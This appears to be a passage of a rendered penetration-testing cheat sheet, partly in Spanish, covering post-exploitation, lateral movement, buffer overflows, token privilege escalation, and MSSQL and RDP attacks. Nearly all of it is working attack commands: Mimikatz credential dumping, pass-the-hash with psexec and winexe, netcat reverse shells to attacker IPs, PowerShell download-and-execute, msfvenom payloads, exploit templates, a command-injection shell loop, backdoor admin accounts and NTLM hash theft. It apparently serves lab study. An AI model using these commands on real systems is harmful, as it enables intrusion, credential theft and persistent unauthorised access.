+i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
+</code></pre></div><hr>
+<h1 id="post-explotation">Post Explotation</h1>
+<h2 id="crackmapexec">Crackmapexec</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Cmpe Enumeration)</span>
+crackmapexec smb &lt;IP&gt;
+crackmapexec smb &lt;IP&gt; -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span>
+crackmapexec smb &lt;IP&gt; -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span>
+
+<span style="color:#75715e">#(List Shares)</span>
+crackmapexec smb &lt;IP&gt; -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+
+<span style="color:#75715e">#(Cmpe Smb Brute Force)</span>
+crackmapexec smb $IP -u $USERLIST -p $PASSWORDLIST
+cmpe -t <span style="color:#ae81ff">200</span>  smb 10.11.1.24 -u users.txt -p passwords.txt -d svcorp.com --continue-on-success
+
+
+<span style="color:#75715e">#(Cmpe winrm Brute Force)</span>
+crackmapexec winrm &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
+
+</code></pre></div><h3 id="evil-winrm">Evil-winrm</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">evil-winrm -i $ip -u $user -p $password
+evil-winrm -i $ip -u $user -H $hash
+</code></pre></div><h2 id="mimikatz">MIMIKATZ</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">privilege::debug
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+kerberos::list /export
+
+vault::cred
+vault::list
+
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+</code></pre></div><hr>
+<h2 id="lateral-movements">Lateral-Movements</h2>
+<h3 id="winexe---pth-winexe">winexe - Pth-winexe</h3>
+<p><strong>Winexe</strong> load a file on the target machine while it is running</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">winexe -U “admin%password123” //192.168.0.105 cmd.exe
+
+<span style="color:#75715e">#(Pass the hash winexec)</span>
+pth-winexe -U <span style="color:#e6db74">&#34;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#34;</span> //10.10.215.28 cmd.exe
+pth-winexe -U <span style="color:#e6db74">&#34;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#34;</span> //10.10.215.28 cmd.exe --system
+
+</code></pre></div><h2 id="psexec">psexec</h2>
+<p><strong>psexec</strong> load a file on the target machine while it is running</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(basic use psexec)</span>
+psexec.py admin:password123@192.168.0.105 cmd.exe
+
+<span style="color:#75715e">#(psexec hash)</span>
+psexec.py WORKGROUP/Administrator@10.11.1.22 -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb
+
+<span style="color:#75715e">#(we can execute a rev shell if first we can upload the nc file to the target machine)</span>
+psexec.exe -u $username  -p $password <span style="color:#ae81ff">\\</span>$ip <span style="color:#e6db74">&#34;C:\Inetpub\nc.exe -e cmd.exe </span>$ip<span style="color:#e6db74"> </span>$port<span style="color:#e6db74">&#34;</span>
+</code></pre></div><h2 id="smbexec">Smbexec</h2>
+<p>smbexec don&rsquo;t load a file on the target machine while it is running</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(basic use smbexec)</span>
+smbexec.py user:password@192.168.0.105
+<span style="color:#75715e">#(smbexec hash)</span>
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da admin@192.168.0.105
+</code></pre></div><hr>
+<h2 id="data-manipulation">Data Manipulation</h2>
+<p>#regex</p>
+<h3 id="sed">Sed</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Replace Multiple Characters)</span>
+sed <span style="color:#e6db74">&#39;s/a/A/g; s/1/23/g&#39;</span> test.txt &gt; test2.txt
+
+<span style="color:#75715e">#(Delete Lines from 3 to 5) </span>
+sed -e <span style="color:#e6db74">&#39;3,5d&#39;</span>
+sed -e <span style="color:#e6db74">&#39;1d ; 2d ; 3d&#39;</span>
+
+<span style="color:#75715e">#(Delete lines from 5 to 10 and 12)</span>
+sed -e <span style="color:#e6db74">&#39;5,10d;12d&#39;</span> file 
+
+<span style="color:#75715e">#(Delete white lines)</span>
+sed  <span style="color:#e6db74">&#39;/^\s*$/d&#39;</span>
+
+<span style="color:#75715e">#(Show lines from 6 to 29)</span>
+sed -n <span style="color:#e6db74">&#39;6,29p&#39;</span> $file
+
+<span style="color:#75715e">#(Extraer Valores con regexp)</span>
+echo <span style="color:#e6db74">&#34;x:1157 y:451 screen:0 window:18937788&#34;</span> | sed <span style="color:#e6db74">&#39;s/x:\(.*\) y:\(.*\) screen:\(.*\) window:\(.*\)/\1, \2 \4/&#39;</span>
+
+&gt;&gt; 1157, <span style="color:#ae81ff">451</span> <span style="color:#ae81ff">18937788</span>
+
+echo <span style="color:#e6db74">&#34;x:1157 y:451 screen:0 window:18937788&#34;</span> | sed <span style="color:#e6db74">&#39;s/x:\(.*\) y:\(.*\) screen:\(.*\)/\1, \2/&#39;</span>
+&gt;&gt; 1157, <span style="color:#ae81ff">451</span>
+
+</code></pre></div><h3 id="awk">Awk</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Delete white lines)</span>
+awk /./ $file
+
+<span style="color:#75715e">#(Show line number 4)</span>
+awk ‘NR<span style="color:#f92672">==</span>4’
+awm ‘NR<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">||</span> NR<span style="color:#f92672">==</span>5’
+
+<span style="color:#75715e">#(Show the las column)</span>
+awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span>
+
+<span style="color:#75715e">#(Modify value column number)</span>
+awk <span style="color:#e6db74">&#39;$1=&#34;value&#34;$1&#34;newvalue&#34;&#39;</span> FS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span> cheatsheet.md
+</code></pre></div><h2 id="filter-only-the-things-between--begin-y-end-with-sed">Filter Only the things between  &lsquo;BEGIN&rsquo; y &lsquo;END&rsquo; with sed</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo <span style="color:#ae81ff">\&#34;</span>BEGIN<span style="color:#ae81ff">\&#34;</span> ; <span style="color:#e6db74">${</span>CMD<span style="color:#e6db74">}</span> ; echo <span style="color:#ae81ff">\&#34;</span>END<span style="color:#ae81ff">\&#34;</span> | sed -n -e <span style="color:#e6db74">&#39;/BEGIN/,/END/ p&#39;</span>
+</code></pre></div><p><strong>for example</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+	echo -n <span style="color:#e6db74">&#34;</span>$<span style="color:#e6db74">&#34;</span> 
+	<span style="color:#75715e"># reading input user</span>
+	read cmd
+	<span style="color:#75715e"># making the request</span>
+	curl --silent -d
+<span style="color:#e6db74">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%-3D%3E;echo \&#34;BEGIN\&#34;;</span><span style="color:#e6db74">${</span>cmd<span style="color:#e6db74">}</span><span style="color:#e6db74">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>URL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | sed -n -e <span style="color:#e6db74">&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1 ; <span style="color:#66d9ef">done</span>
+</code></pre></div><h3 id="order-wordlists-by-line-numbers">Order wordlists by line Numbers</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">find. -type f -iname <span style="color:#e6db74">&#34;*txt&#34;</span> | grep <span style="color:#e6db74">&#34;user&#34;</span> | xargs wc -l | sort -nr
+</code></pre></div><h3 id="extract-hash">Extract hash</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">grep -oP <span style="color:#e6db74">&#34;[A-Za-z0-9]{30,}&#34;</span>
+</code></pre></div><h4 id="agregar-un-caracter-a-lineas-con-determinado-patron-por-ejp">Agregar un caracter a lineas con determinado Patron por ejp</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat cheatsheet.md | sed <span style="color:#e6db74">&#39;/^[A-Z]/ s/^/##/g&#39;</span>
+</code></pre></div><hr>
+<h1 id="powershell-cheatsheet">Powershell-Cheatsheet</h1>
+<p><strong>[Environment]::Is64bitOperatingSystem</strong>
+<strong>[Environment]::Is64bitProcess</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
+<span style="color:#75715e">#(start pwsh)</span>
+powershell -nop -ep bypass
+
+<span style="color:#75715e">#(Load file in memory)</span>
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysnative<span style="color:#ae81ff">\W</span>indowsPowershell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe IEX<span style="color:#f92672">(</span>New-ObjectNet.webclient<span style="color:#f92672">)</span>.downloadstring<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;http://xxx.xxx.xx.x&#39;</span>/test.ps1<span style="color:#f92672">)</span>
+
+<span style="color:#75715e">#(powershell history)</span>
+recent
+<span style="color:#75715e">#(powershell hist)</span>
+type %userprofile%<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\P</span>owerShell<span style="color:#ae81ff">\P</span>SReadline<span style="color:#ae81ff">\C</span>onsoleHost_history.txt
+<span style="color:#75715e">#(cmd hist)</span>
+Get-Content -Path C:<span style="color:#ae81ff">\U</span>ser<span style="color:#ae81ff">\d</span>ark<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\P</span>owerShell<span style="color:#ae81ff">\P</span>SReadline<span style="color:#ae81ff">\C</span>onsoleHost_history.txt
+
+<span style="color:#75715e">#(download file)</span>
+Invoke-WebRequest http://10.14.1.196 -OutFile $name
+
+
+<span style="color:#75715e">#(import module)</span>
+Import-Module ./powerup.ps1
+Invoke-AllChecks
+
+
+<span style="color:#75715e">#(List Execution Content to know if we restricted)</span>
+powershell $ExecutionContext.SessionState.LanguageMode
+
+</code></pre></div><p>==<strong>Reuse Credentials</strong>==</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#(optional)</span>
+$username = <span style="color:#e6db74">&#34;Sniper\chris&#34;</span> 
+$pass =  <span style="color:#e6db74">&#34;36mEAhz/B8xQ~2VM&#34;</span>
+
+$password = ConvertTo-SecureString <span style="color:#e6db74">&#34;36mEAhz/B8xQ~2VM&#34;</span> -AsPlainText -Force
+$password = ConvertTo-SecureString $pass -AsPlainText -Force
+
+//Credential
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $password
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist <span style="color:#e6db74">&#34;Sniper\chris&#34;</span>, $password
+
+
+// execute commands as <span style="color:#960050;background-color:#1e0010">:</span> 
+Invoke-Command -ScriptBlock { whoami } -Credential $credential -Computer localhost
+</code></pre></div><h1 id="buffer-overflow">Buffer Overflow</h1>
+<h2 id="bof-templates">Bof Templates</h2>
+<p><strong>Fuzzer.py</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>
+<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> socket
+
+direccion <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;192.168.0.110&#39;</span>
+puerto <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+buffer <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;A&#39;</span>]
+contador <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
+
+<span style="color:#66d9ef">while</span> len(buffer) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">20</span> :
+    buffer<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>contador)
+    contador <span style="color:#f92672">=</span> contador <span style="color:#f92672">+</span> <span style="color:#ae81ff">100</span>
+<span style="color:#66d9ef">try</span> :
+        <span style="color:#66d9ef">for</span> cadena <span style="color:#f92672">in</span> buffer :
+                <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[+] Enviando </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> bytes...&#39;</span> <span style="color:#f92672">%</span> len (cadena)
+                s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+                s<span style="color:#f92672">.</span>connect((direccion, puerto))
+                s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+                s<span style="color:#f92672">.</span>send(cadena <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+                s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+                <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[+] Listo&#39;</span>
+<span style="color:#66d9ef">except</span> :
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[!] No se puede conectar al programa. Puede que lo hayas crasheado.&#39;</span>
+    sys<span style="color:#f92672">.</span>exit( <span style="color:#ae81ff">0</span> )
+<span style="color:#66d9ef">finally</span> :
+    s<span style="color:#f92672">.</span>close()
+
+</code></pre></div><h4 id="bofpy">Bof.Py</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>
+<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> socket
+
+direccion <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
+puerto <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+buffer <span style="color:#f92672">=</span> <span style="color:#75715e">#Definir buffer</span>
+
+<span style="color:#66d9ef">try</span> :
+	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[+] Enviando buffer&#39;</span>
+	s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+	s<span style="color:#f92672">.</span>connect((direccion, puerto))
+	s<span style="color:#f92672">.</span>send(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+	s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+<span style="color:#66d9ef">except</span> :
+	<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;[!] No se puede conectar al programa.&#39;</span>
+	sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+<span style="color:#66d9ef">finally</span> :
+	s<span style="color:#f92672">.</span>close()
+</code></pre></div><h2 id="bof-cheatsheet">Bof-cheatsheet</h2>
+<h3 id="mona-commands-">Mona Commands 🐒</h3>
+<p><strong>Usefull mona commands</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Setting working folder)</span>
+!mona config -set workingfolder C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>imon<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\m</span>ona
+
+<span style="color:#75715e">#(Spiking Identifing Vulnerable Field)</span>
+python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*5000 | xclip -sel clip &#34;</span>
+
+<span style="color:#75715e">#(to debug)</span>
+print s.recv<span style="color:#f92672">(</span>1024<span style="color:#f92672">)</span>   <span style="color:#75715e"># to print the responses</span>
+print s.send<span style="color:#f92672">(</span>buffer + <span style="color:#e6db74">&#39;\r\n&#39;</span> <span style="color:#f92672">)</span>  <span style="color:#75715e"># to send data</span>
+
+<span style="color:#75715e">#(Find the Offset)</span>
+!mona pattern_create <span style="color:#ae81ff">5000</span>
+
+<span style="color:#75715e">#(Modification Payload)</span>
+buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mona-pattern&#34;</span>
+
+<span style="color:#75715e">#(Overwriting EIP)</span>
+!mona pattern_offset $EIP
+
+<span style="color:#75715e">#(Modification Payload)</span>
+buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span>*2012 + <span style="color:#e6db74">&#34;B&#34;</span>*4 + <span style="color:#e6db74">&#34;C&#34;</span>*100 
+
+<span style="color:#75715e">#(Finding Bad Characters)</span>
+!mona bytearray -b <span style="color:#e6db74">&#34;\x00&#34;</span>
+
+<span style="color:#75715e">#(find location of a jump esp)</span>
+!mona jmp -r esp 
+!mona jmp -r esp -cpb <span style="color:#e6db74">&#34;\x00\x0a\x0d&#34;</span>
+
+<span style="color:#75715e">#(If we can&#39;t found jmp esp with thah intruction so)</span>
+
+<span style="color:#75715e">#(Find ESP Jump in module)</span>
+!mona find -s <span style="color:#e6db74">&#34;\xff\xe4&#34;</span>
+// or <span style="color:#66d9ef">if</span> we see dll
+!mona find -s <span style="color:#e6db74">&#34;\xff\xe4&#34;</span> -m slmfc.dll
+
+<span style="color:#75715e">#(Print instruction to jmp esp)</span>
+nasm_shell
+&gt; JMP ESP
+
+<span style="color:#75715e">#(Modification Payload)</span>
+badchars <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>$bytearray<span style="color:#f92672">)</span>
+buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span>*2012 + <span style="color:#e6db74">&#34;B&#34;</span>*4 + <span style="color:#e6db74">&#34;C&#34;</span>*100 + badchars
+
+
+
+<span style="color:#75715e">#(Find Module)</span>
+1. !mona jmp -r esp
+2. !mona jmp -r esp -m <span style="color:#e6db74">&#39;essfunc.dll&#39;</span>
+
+<span style="color:#75715e">#(Convert from big endian to little endian - ESP Jum adress)</span>
+625014df
+<span style="color:#ae81ff">\x</span>df<span style="color:#ae81ff">\x</span>14<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">62</span>
+
+<span style="color:#75715e">#(Modification Payload)</span>
+buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span>*2012 + <span style="color:#e6db74">&#34;\xdf\x14\50\62&#34;</span> + <span style="color:#e6db74">&#34;\x90&#34;</span>*20 + buff
+
+
+!mona findsmp -distance <span style="color:#ae81ff">634</span>
+!mona compare -f C:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\v</span>ulnapp<span style="color:#ae81ff">\b</span>ytearray.txt -a &lt;ESP_badchar_address&gt;
+
+<span style="color:#75715e">#(Mona modules)</span>
+!mona modules
+
+<span style="color:#75715e">#(find address of &#34;jmp esp&#34; (xff xe4))</span>
+!mona find -s <span style="color:#e6db74">&#34;\xff\xe4&#34;</span> -m <span style="color:#e6db74">&#34;suspectmodule.dll&#34;</span>
+
+<span style="color:#75715e">#(Generating Msfvenom - reverse shell)</span>
+msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.0.104 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -b <span style="color:#e6db74">&#34;\x00&#34;</span>  -f c  -v buff EXITFUNC<span style="color:#f92672">=</span>thread
+msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.92 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>  -b <span style="color:#e6db74">&#34;\x00\x0a\x0d&#34;</span> -f py -v buff EXITFUNC<span style="color:#f92672">=</span>thread
+
+
+</code></pre></div><hr>
+<h2 id="token-privileges">Token Privileges</h2>
+<h2 id="juicy-potato">Juicy Potato</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">If the user has SeImpersonate or SeAssignPrimaryToken privileges <span style="color:#66d9ef">then</span> you are SYSTEM.
+
+<span style="color:#75715e">#(Executing Commands like nt authority trought JuicyPotato)</span>
+JuicyPotato.exe -l <span style="color:#ae81ff">1337</span> -p c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\c</span>md.exe -a <span style="color:#e6db74">&#34;/c net user lemon lemon123 /add&#34;</span> -t *
+
+<span style="color:#75715e">#(Basic Use)</span>
+JuicyPotato -l <span style="color:#ae81ff">1337</span> -p c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\c</span>md.exe -a <span style="color:#e6db74">&#34;/c \\192.168.119.148\share\nc.exe -e cmd.exe 192.168.119.148 443&#34;</span> -t *
+
+<span style="color:#75715e">#(Basic Use with ClSID)</span>
+JuicyPotato -l  <span style="color:#ae81ff">1337</span>  -p c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\c</span>md.exe -a <span style="color:#e6db74">&#34;/c \\192.168.119.148\share\nc.exe -e cmd.exe 192.168.119.148 443&#34;</span> -t * -c <span style="color:#e6db74">&#34;{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}&#34;</span>
+
+<span style="color:#75715e"># CLSID</span>
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+</code></pre></div><p><strong>Windows Server 2003</strong>
+<strong>churrasco</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">churrasco.exe -e cmd.exe
+churrasco.exe -d <span style="color:#e6db74">&#34;C:\wmpub\nc.exe 10.10.14.7 7777 -e cmd.exe&#34;</span>
+</code></pre></div><p><strong>Windows Server 2016</strong>
+if the user has <strong>SeImpersonatePrivilege</strong> or  <strong>SeAssignPrimaryTokenPrivilege</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PrintSpoofer.exe -i -c cmd.exe
+</code></pre></div><h2 id="incognitoexe">Incognito.exe</h2>
+<p>if the user has <strong>SeimpersonatePrivilege</strong> and  <strong>SeDebugPrivilege</strong> we can use the module , only with both tokens enabbled</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(List avaible Tokens -&gt; Look for the tokens of nt authority system)</span>
+incognito list_tokens -u
+
+incognito add_user backdoor <span style="color:#ae81ff">12345</span>
+incognito add_localgroup_user Administrators backdoor
+
+</code></pre></div><h3 id="hashes">HASHES</h3>
+<h3 id="windows">Windows</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">reg save HKLM<span style="color:#ae81ff">\S</span>AM c:<span style="color:#ae81ff">\S</span>AM
+reg save HKLM<span style="color:#ae81ff">\S</span>ystem c:<span style="color:#ae81ff">\S</span>ystem
+
+samdump2 System SAM &gt; hashes
+</code></pre></div><h2 id="mssql---1433">MSSQL - 1433</h2>
+<h3 id="get-information">Get information</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port<span style="color:#f92672">=</span>1433,mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>,mssql.instance-name<span style="color:#f92672">=</span>MSSQLSERVER -sV -p <span style="color:#ae81ff">1433</span> &lt;IP&gt;
+</code></pre></div><h3 id="brute-force-3">Brute force</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mssql -vV -I -u
+</code></pre></div><h3 id="having-credentials">Having credentials</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
+
+<span style="color:#75715e"># Once logged in you can run queries:</span>
+SQL&gt; <span style="color:#66d9ef">select</span> @@ version;
+
+<span style="color:#75715e"># Steal NTLM hash</span>
+sudo smbserver.py -smb2support liodeus .
+SQL&gt; exec master..xp_dirtree <span style="color:#e6db74">&#39;\\&lt;IP&gt;\liodeus\&#39;</span> <span style="color:#75715e"># Steal the NTLM hash, crack it with john or hashcat</span>
+
+<span style="color:#75715e"># Try to enable code execution</span>
+SQL&gt; enable_xp_cmdshell
+
+<span style="color:#75715e"># Execute code</span>
+SQL&gt; xp_cmdshell whoami /all
+SQL&gt; xp_cmdshell certutil.exe -urlcache -split -f http://&lt;IP&gt;/nc.exe
+</code></pre></div><h3 id="manual-exploit">Manual exploit</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Cheatsheet :
+	- https://www.asafety.fr/mssql-injection-cheat-sheet/
+</code></pre></div><h2 id="rdp---3389">RDP - 3389</h2>
+<h3 id="brute-force-4">Brute force</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">crowbar -b rdp -s &lt;IP&gt;/CIDR -u &lt;eUSER&gt; -C &lt;PASSWORDS_LIST&gt;
+crowbar -b rdp -s &lt;IP&gt;/CIDR -U &lt;USERS_LIST&gt; -C &lt;PASSWORDS_LIST&gt;
+
+hydra -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; rdp://&lt;IP&gt; -u -vV
+</code></pre></div><h3 id="connect-with-known-credentials--hash">Connect with known credentials / hash</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rdesktop -u &lt;USERNAME&gt; &lt;IP&gt;
+rdesktop -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;IP&gt;
+
+xfreerdp /u:<span style="color:#f92672">[</span>DOMAIN<span style="color:#ae81ff">\]</span>&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt;
